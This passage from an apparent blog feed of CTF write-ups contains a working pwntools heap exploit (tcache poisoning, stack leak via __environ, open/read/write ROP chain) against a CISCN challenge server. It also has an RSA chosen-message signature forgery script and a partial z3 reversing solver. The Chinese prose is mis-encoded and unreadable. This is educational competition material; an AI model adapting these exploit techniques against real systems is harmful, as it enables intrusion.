class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = binary = ELF(<span class="string">'./EzHeap'</span>)</span><br><span class="line">libc = binary.libc</span><br><span class="line"><span class="comment"># context.log_level = 'critical'</span></span><br><span class="line"></span><br><span class="line">libc_offset = <span class="number">0x21ace0</span></span><br><span class="line">heap_offset = <span class="number">0x1040</span></span><br><span class="line">tcache_50_offset = <span class="number">0x4d0</span></span><br><span class="line">tcache_110_offset = <span class="number">0x2420</span></span><br><span class="line">heap_flag_offset = <span class="number">0x2420</span></span><br><span class="line">stack_offset = <span class="number">0x170</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = binary.process()</span></span><br><span class="line">p = remote(<span class="string">'8.147.133.76'</span>, <span class="number">13951</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b'choice &gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc_heap</span>(<span class="params">size, content</span>):</span><br><span class="line">    menu()</span><br><span class="line">    p.sendline(<span class="string">b'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'size:'</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b'content:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free_heap</span>(<span class="params">index</span>):</span><br><span class="line">    menu()</span><br><span class="line">    p.sendline(<span class="string">b'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'idx:'</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_heap</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    menu()</span><br><span class="line">    p.sendline(<span class="string">b'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'idx:'</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b'size:'</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b'content:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_heap</span>(<span class="params">index</span>):</span><br><span class="line">    menu()</span><br><span class="line">    p.sendline(<span class="string">b'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'idx:'</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_program</span>():</span><br><span class="line">    menu()</span><br><span class="line">    p.sendline(<span class="string">b'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mangle</span>(<span class="params">pos, ptr, page_offset=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">return</span> ((pos &gt;&gt; <span class="number">12</span>) + page_offset) ^ ptr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">demangle</span>(<span class="params">ptr, page_offset=<span class="number">0</span></span>):</span><br><span class="line">    pos = (ptr &gt;&gt; <span class="number">12</span>) + page_offset</span><br><span class="line">    m = pos ^ ptr</span><br><span class="line">    <span class="keyword">return</span> m &gt;&gt; <span class="number">24</span> ^ m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_heap_libc</span>():</span><br><span class="line">    <span class="keyword">global</span> heap_leak, libc_leak</span><br><span class="line">    <span class="comment"># idx 0</span></span><br><span class="line">    malloc_heap(<span class="number">0x40</span>, <span class="string">b'A'</span>*<span class="number">0x40</span>)</span><br><span class="line">    edit_heap(<span class="number">0</span>, <span class="number">0x50</span>, <span class="string">b'A'</span>*<span class="number">0x50</span>)</span><br><span class="line">    show_heap(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'A'</span>*<span class="number">0x50</span>)</span><br><span class="line">    libc_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">    edit_heap(<span class="number">0</span>, <span class="number">0xd0</span>, <span class="string">b'B'</span>*<span class="number">0xd0</span>)</span><br><span class="line">    show_heap(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'B'</span>*<span class="number">0xd0</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">    payload = <span class="string">b'A'</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + p64(libc_leak) + p64(libc_leak)</span><br><span class="line">    payload = payload.ljust(<span class="number">0xd0</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    edit_heap(<span class="number">0</span>, <span class="number">0xd0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">### stage1: leak libc and heap</span></span><br><span class="line">leak_heap_libc()</span><br><span class="line">info(<span class="string">f'[LEAK] heap_leak: <span class="subst">{<span class="built_in">hex</span>(heap_leak)}</span>'</span>)</span><br><span class="line">info(<span class="string">f'[LEAK] libc_leak: <span class="subst">{<span class="built_in">hex</span>(libc_leak)}</span>'</span>)</span><br><span class="line">libc.address = libc_leak - libc_offset</span><br><span class="line">heap_base = heap_leak - heap_offset</span><br><span class="line">info(<span class="string">f'[CALC] libc_base: <span class="subst">{<span class="built_in">hex</span>(libc.address)}</span>'</span>)</span><br><span class="line">info(<span class="string">f'[CALC] heap_base: <span class="subst">{<span class="built_in">hex</span>(heap_base)}</span>'</span>)</span><br><span class="line">environ_addr = libc.sym[<span class="string">'__environ'</span>]</span><br><span class="line">info(<span class="string">f'[CALC] environ_addr: <span class="subst">{<span class="built_in">hex</span>(environ_addr)}</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### stage2: leak stack</span></span><br><span class="line"><span class="comment"># idx1</span></span><br><span class="line">malloc_heap(<span class="number">0x40</span>, <span class="string">b'B'</span>*<span class="number">0x40</span>)</span><br><span class="line"><span class="comment"># idx2</span></span><br><span class="line">malloc_heap(<span class="number">0x40</span>, <span class="string">b'C'</span>*<span class="number">0x40</span>)</span><br><span class="line">free_heap(<span class="number">2</span>)</span><br><span class="line">free_heap(<span class="number">1</span>)</span><br><span class="line">mangled_environ_addr = mangle(heap_base + tcache_50_offset, environ_addr - <span class="number">0x40</span>)</span><br><span class="line">info(<span class="string">f'[CALC] mangled_environ_addr: <span class="subst">{<span class="built_in">hex</span>(mangled_environ_addr)}</span>'</span>)</span><br><span class="line">payload = <span class="number">0x40</span> * <span class="string">b'A'</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>) + p64(mangled_environ_addr)</span><br><span class="line">edit_heap(<span class="number">0</span>, <span class="number">0x58</span>, payload)</span><br><span class="line"><span class="comment"># idx1</span></span><br><span class="line">malloc_heap(<span class="number">0x40</span>, <span class="string">b'B'</span>*<span class="number">0x40</span>)</span><br><span class="line"><span class="comment"># idx2(environ_addr - 0x40)</span></span><br><span class="line">malloc_heap(<span class="number">0x40</span>, <span class="string">b'C'</span>*<span class="number">0x40</span>)</span><br><span class="line">show_heap(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">b'C'</span>*<span class="number">0x40</span>)</span><br><span class="line">stack_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">info(<span class="string">f'[LEAK] stack_leak: <span class="subst">{<span class="built_in">hex</span>(stack_leak)}</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### stage3: overwrite stack with rop chain</span></span><br><span class="line"><span class="comment"># idx3</span></span><br><span class="line">malloc_heap(<span class="number">0x100</span>, <span class="string">b'D'</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># idx4</span></span><br><span class="line">malloc_heap(<span class="number">0x100</span>, <span class="string">b'E'</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># idx5</span></span><br><span class="line">malloc_heap(<span class="number">0x100</span>, <span class="string">b'F'</span>*<span class="number">0x100</span>)</span><br><span class="line">free_heap(<span class="number">5</span>)</span><br><span class="line">free_heap(<span class="number">4</span>)</span><br><span class="line">target_stack = stack_leak - stack_offset</span><br><span class="line">info(<span class="string">f'[CALC] target_stack: <span class="subst">{<span class="built_in">hex</span>(target_stack)}</span>'</span>)</span><br><span class="line">mangled_stack = mangle(heap_base + tcache_110_offset, target_stack-<span class="number">0x8</span>)</span><br><span class="line">info(<span class="string">f'[CALC] mangled_stack: <span class="subst">{<span class="built_in">hex</span>(mangled_stack)}</span>'</span>)</span><br><span class="line">payload = <span class="number">0x100</span> * <span class="string">b'A'</span> + p64(<span class="number">1</span>) + p64(<span class="number">0x91</span>) + p64(mangled_stack)</span><br><span class="line">edit_heap(<span class="number">3</span>, <span class="number">0x118</span>, payload)</span><br><span class="line"><span class="comment"># idx4</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">malloc_heap(<span class="number">0x100</span>, <span class="string">b'flag\x00'</span>.ljust(<span class="number">0x100</span>, <span class="string">b'\x00'</span>))</span><br><span class="line"><span class="comment"># idx5(target_stack-0x20)</span></span><br><span class="line">payload = p64(stack_leak)</span><br><span class="line">flag_addr = heap_base + heap_flag_offset</span><br><span class="line">rop = ROP(libc)</span><br><span class="line"><span class="comment"># raw orw</span></span><br><span class="line">syscall_gadget = rop.find_gadget([<span class="string">'syscall'</span>, <span class="string">'ret'</span>]).address</span><br><span class="line">pop_rax = rop.find_gadget([<span class="string">'pop rax'</span>, <span class="string">'ret'</span>]).address</span><br><span class="line">pop_rdi = rop.find_gadget([<span class="string">'pop rdi'</span>, <span class="string">'ret'</span>]).address</span><br><span class="line">pop_rsi = rop.find_gadget([<span class="string">'pop rsi'</span>, <span class="string">'ret'</span>]).address</span><br><span class="line"><span class="comment"># pop_rdx = rop.find_gadget(['pop rdx', 'ret']).address</span></span><br><span class="line">pop_rdx_r12 = libc.address + <span class="number">0x000000000011f2e7</span></span><br><span class="line"><span class="comment"># open('flag.txt', 0, 0)</span></span><br><span class="line">payload += p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx_r12) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)+ p64(pop_rax) + p64(<span class="number">2</span>) + p64(syscall_gadget)</span><br><span class="line"><span class="comment"># read(3, target_stack+0x100, 0x100)</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(target_stack+<span class="number">0x100</span>) + p64(pop_rdx_r12) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>)+ p64(pop_rax) + p64(<span class="number">0</span>) + p64(syscall_gadget)</span><br><span class="line"><span class="comment"># write(1, target_stack+0x100, 0x100)</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(target_stack+<span class="number">0x100</span>) + p64(pop_rdx_r12) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>)+ p64(pop_rax) + p64(<span class="number">1</span>) + p64(syscall_gadget)</span><br><span class="line">payload += rop.chain()</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b'\x00'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, 'b *$rebase(0x16cd)')</span></span><br><span class="line">malloc_heap(<span class="number">0x100</span>, payload)</span><br><span class="line">flag = p.recvuntil(<span class="string">b'}'</span>)</span><br><span class="line">success(<span class="string">f'[FLAG] <span class="subst">{flag.decode()}</span>'</span>)</span><br></pre></td></tr></tbody></table></figure><p>æœ€åå¾—åˆ° flag ï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{c9112d19-27e3-41ec-9957-fefb3f109229}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <summary type="html">CISCN 2024 åˆèµ›ä¸ªäººé¢˜è§£ï¼ˆWith M4CR0ï¼‰ã€‚</summary>
    
    
    
    <category term="CTF" scheme="https://blog.beacox.space/categories/CTF/"/>
    
    
    <category term="PWN" scheme="https://blog.beacox.space/tags/PWN/"/>
    
    <category term="Crypto" scheme="https://blog.beacox.space/tags/Crypto/"/>
    
    <category term="Misc" scheme="https://blog.beacox.space/tags/Misc/"/>
    
    <category term="Reverse" scheme="https://blog.beacox.space/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>TBTL CTF 2024 WriteUp</title>
    <link href="https://blog.beacox.space/posts/tbtlctf-2024-wp/"/>
    <id>https://blog.beacox.space/posts/tbtlctf-2024-wp/</id>
    <published>2024-05-13T06:45:00.000Z</published>
    <updated>2024-05-13T12:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨ discord ä¸Šè®¤è¯†äº†ä¸€ç¾¤æ¥è‡ªä¸–ç•Œå„åœ°çš„ ctferï¼Œä¸è¿‡å¤§å®¶éƒ½ä¸æ˜¯ä»€ä¹ˆè€èµ›æ£ï¼Œjust ctf for fun!<br>æœ‰äººåœ¨é¢‘é“é‡Œæè®®å‚åŠ <a href="https://ctftime.org/event/2324">TBTL CTF 2024</a>ï¼Œç„¶åå°±ç»„äº†ä¸ªé˜Ÿã€‚æ¯”èµ›æ—¶é—´2å¤©ï¼Œå®é™…ä¸Šæ²¡ä»€ä¹ˆæ—¶é—´æ‰“ï¼Œåšäº†å‡ ä¸ªæ–¹å‘çš„æ–°æ‰‹å‹å¥½é¢˜ã€‚ä¸è¿‡é˜Ÿé‡Œæœ‰ä¸ªå“¥ä»¬ web æ–¹å‘ 3/4ï¼Œæœ€åé˜Ÿä¼æ’å36ã€‚</p><p><img src="https://bu.dusays.com/2024/05/13/6641b5128b62e.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/05/13/6641b5128b62e.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="æœ€ç»ˆæ’å"></p><h2 id="Tower-of-Babel"><a href="#Tower-of-Babel" class="headerlink" title="Tower of Babel"></a>Tower of Babel</h2><p>è¿™æ˜¯ä¸€é“ç®€å•çš„ç¤¾å·¥é¢˜ã€‚</p><p>mp3 æ–‡ä»¶é‡Œæœ‰è¿™é“é¢˜çš„æç¤ºï¼š</p><blockquote><p>è¯¥æ ‡å¿—çš„æ ¼å¼å¦‚å¸¸ï¼Œæˆ‘ä»¬çš„åˆä½œä¼™ä¼´äº‘æµ·è¿é”æ§è‚¡æœ‰é™å…¬å¸æ€»éƒ¨ä½äºæµ·å—å²›æµ·å£é™„è¿‘ã€‚æ‰¾åˆ°è·ç¦»ä»–ä»¬çš„åŠäº‹å¤„æœ€è¿‘çš„é“¶è¡Œã€‚æ ‡å¿—å†…çš„å†…å®¹æ˜¯è¯¥é“¶è¡Œçš„ç»Ÿä¸€ç¤¾ä¼šä¿¡ç”¨ä»£ç ã€‚ä»£ç å·²ä»¥91å¼€å§‹ï¼Œä»¥56ç»“æŸã€‚</p></blockquote><p>é¦–å…ˆæœè¿™å®¶å…¬å¸ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ª<a href="https://patents.google.com/patent/CN111597584B/zh">ç½‘ç«™</a>æ‰¾åˆ°å…¶åœ°å€ï¼Œæ‰“å¼€é«˜å¾·åœ°å›¾æœç´¢â€œäº‘æµ·é“¾8831æ ‹â€å¯ä»¥æ‰¾åˆ°è¯¥å…¬å¸ä½ç½®ï¼Œç„¶åå†æœå‘¨è¾¹â€”â€”é“¶è¡Œï¼Œå¯ä»¥çœ‹åˆ°æœ€è¿‘çš„é“¶è¡Œæ˜¯æµ·å—æ¾„è¿ˆå†œæ‘å•†ä¸šé“¶è¡Œè‚¡ä»½æœ‰é™å…¬å¸ç§‘æŠ€æ”¯è¡Œã€‚</p><p>ç„¶åæˆ‘ä»¬æœç´¢å…¶<a href="https://www.registrationchina.com/company-search/?value=%E6%B5%B7%E5%8D%97%E6%BE%84%E8%BF%88%E5%86%9C%E6%9D%91%E5%95%86%E4%B8%9A%E9%93%B6%E8%A1%8C%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E7%A7%91%E6%8A%80%E6%94%AF%E8%A1%8C">ç¤¾ä¼šä¿¡ç”¨ä»£ç </a>ï¼Œå¾—åˆ°<code>91469027MA5TRBAW56</code>ã€‚</p><p>å› æ­¤ flag ä¸º <code>TBTL{91469027MA5TRBAW56}</code>ã€‚</p><h2 id="Wikipedia-Signatures"><a href="#Wikipedia-Signatures" class="headerlink" title="Wikipedia Signatures"></a>Wikipedia Signatures</h2><p>è¿™æ˜¯ä¸€é“éå¸¸ç®€å•çš„æ•°å­—ç­¾åæ”»å‡»é¢˜ç›®ã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯è·å–<code>bytes_to_long(b'I challenge you to sign this message!')</code>çš„æ•°å­—ç­¾åã€‚åŒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æä¾›ä»»ä½•æ¶ˆæ¯ç»™ç­¾åè€…è¿›è¡Œæ•°å­—ç­¾åï¼Œå› æ­¤å¾ˆå®¹æ˜“æƒ³åˆ°è¿™æ˜¯ RSA æ•°å­—ç­¾åä¸­çš„<a href="https://crypto.stackexchange.com/questions/35644/chosen-message-attack-rsa-signature">é€‰æ‹©æ¶ˆæ¯æ”»å‡»</a>ã€‚</p><p>æˆ‘ä»¬å‡è®¾<code>m = bytes_to_long(b'I challenge you to sign this message!') </code>ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯è·å–å…¶æ•°å­—ç­¾åï¼š</p><p>$$ s = m^{d};mod;n$$</p><ul><li><p>é¦–å…ˆï¼Œæˆ‘ä»¬è®©ç­¾åè€…ä¸ºä»»æ„é€‰æ‹©çš„æ¶ˆæ¯ <code>m1</code> è¿›è¡Œç­¾åï¼ˆè¿™é‡Œæˆ‘é€‰ç”¨<code>m1 = bytes_to_long(b'BeaCox')</code>ï¼‰ï¼Œè·å–å¯¹åº”çš„ç­¾åï¼š</p><p>$$s_1=m_{1}^{d};mod;n$$</p></li><li><p>ç„¶åï¼Œæˆ‘ä»¬è®¡ç®—</p><p>$$m_2:=mâ‹…m_{1}^{âˆ’1};mod;n$$</p><p>å¹¶è®©ç­¾åè€…ä¸ºå…¶ç­¾åï¼Œå¾—åˆ°</p><p>$$s_2=m_2^d;mod;n$$â€‹</p></li><li><p>ç”±äº</p><p>$$sâ‰¡s1â‹…s2â‰¡m_1^dâ‹…m_2^dâ‰¡m_1^dâ‹…(mâ‹…m_1^{-1})^dâ‰¡m_1^dâ‹…m^dâ‹…m_1^{-d}â‰¡m^d;(mod;n)$$</p><p>æˆ‘ä»¬å¾ˆå®¹æ˜“å¾—åˆ°</p><p>$$s=s1â‹…s2;mod;n$$</p></li></ul><p>åˆ©ç”¨ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://crypto.stackexchange.com/questions/35644/chosen-message-attack-rsa-signature</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, bytes_to_long</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'0.cloud.chals.io'</span>, <span class="number">31148</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_m2</span>(<span class="params">m, n, m1</span>):</span><br><span class="line">    m1_inv = inverse(m1, n)</span><br><span class="line">    m2 = (m * m1_inv) % n</span><br><span class="line">    <span class="keyword">return</span> m2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_n</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b"RSA public key: ("</span>)</span><br><span class="line">    n = p.recvuntil(<span class="string">b","</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'Sign any other message using wikipedia-RSA'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b'&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">message</span>):</span><br><span class="line">    menu()</span><br><span class="line">    p.sendline(<span class="string">f'2 <span class="subst">{message}</span>'</span>.encode())</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline().strip())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">win</span>(<span class="params">signature</span>):</span><br><span class="line">    menu()</span><br><span class="line">    p.sendline(<span class="string">f'1 <span class="subst">{signature}</span>'</span>.encode())</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(<span class="string">b'I challenge you to sign this message!'</span>)</span><br><span class="line">n = get_n()</span><br><span class="line">m1 = bytes_to_long(<span class="string">b'BeaCox'</span>)</span><br><span class="line">m2 = find_m2(m, n, m1)</span><br><span class="line"></span><br><span class="line">s1 = sign(m1)</span><br><span class="line">s2 = sign(m2)</span><br><span class="line">signature = (s1 * s2) % n</span><br><span class="line">win(signature)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># TBTL{r3p347_4f73r_m3-d16174l_516n47ur3_15_n07_3ncryp710n}</span></span><br></pre></td></tr></tbody></table></figure><h2 id="Floo-Powder"><a href="#Floo-Powder" class="headerlink" title="Floo Powder"></a>Floo Powder</h2><p>è¿™æ˜¯ä¸€é“ç®€å•çš„é€†å‘é¢˜ã€‚ä» ida è·å–é™æ€çš„æ•°ç»„ï¼Œç„¶åæ ¹æ®åç¼–è¯‘çš„ä»£ç å†™ z3 çš„çº¦æŸï¼Œç¼–å†™ python è„šæœ¬æ¥å¾—åˆ°æ­£ç¡®çš„è¾“å…¥ã€‚</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># input is 31*31 bit(0 or 1) string</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">data = [</span><br><span class="line">    <span class="number">0x04CA4952</span>, <span class="number">0x69745A2A</span>, <span class="number">0x434A2A90</span>, <span class="number">0x36D0A9C7</span>, <span class="number">0x1002DAC8</span>,</span><br><span class="line">    <span class="number">0x04933AEB</span>, <span class="number">0x71A29525</span>, <span class="number">0x6DA8D531</span>, <span class="number">0x69259680</span>, <span class="number">0x2179213C</span>,</span><br><span class="line">    <span class="number">0x5D8A6097</span>, <span class="number">0x6ACA2822</span>, <span class="number">0x5495ED02</span>, <span class="number">0x255A2CD5</span>, <span class="number">0x16B5625A</span>,</span><br><span class="line">    <span class="number">0x2E8A8ABA</span>, <span class="number">0x2D6F5EB4</span>, <span class="number">0x557CD952</span>, <span class="number">0x2CB4E495</span>, <span class="number">0x020D29B9</span>,</span><br><span class="line">    <span class="number">0x0E8B2854</span>, <span class="number">0x4646C159</span>, <span class="number">0x47749281</span>, <span class="number">0x54229D46</span>, <span class="number">0x6C1CD620</span>,</span><br><span class="line">    <span class="number">0x07F80EFF</span>, <span class="number">0x04AD46A4</span>, <span class="number">0x32EBC04E</span>, <span class="number">0x4FAC1623</span>, <span class="number">0x600E1F04</span>,</span><br><span class="line">    <span class="number">0x24CD3000</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># z3 init the input</span></span><br><span class="line"><span class="built_in">input</span> = [BitVec(<span class="string">f"input<span class="subst">{i}</span>"</span>, <span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>*<span class="number">31</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">important_func</span>(<span class="params">o_i, i_i, count</span>):</span><br><span class="line">    <span class="comment"># print(f"index1: {index1}, index2: {index2}")</span></span><br><span class="line">    <span class="comment"># ( (input[31 * o_i + i_i] == 49) == (((data[count / 31] &gt;&gt; (31 - count % 31 - 1)) &amp; 1) != 0) )</span></span><br><span class="line">    s.add((<span class="built_in">input</span>[<span class="number">31</span> * o_i + i_i] == <span class="number">1</span>) == (((data[count // <span class="number">31</span>] &gt;&gt; (<span class="number">31</span> - count % <span class="number">31</span> - <span class="number">1</span>)) &amp; <span class="number">1</span>) != <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">outside_index = <span class="number">0</span></span><br><span class="line">inside_index = <span class="number">0</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">v9 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (outside_index &lt; <span class="number">31</span> <span class="keyword">and</span> inside_index &lt; <span class="number">31</span>):</span><br><span class="line">    important_func(outside_index, inside_index, count)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">1</span>:</span><br><span class="line">        v10 = outside_index 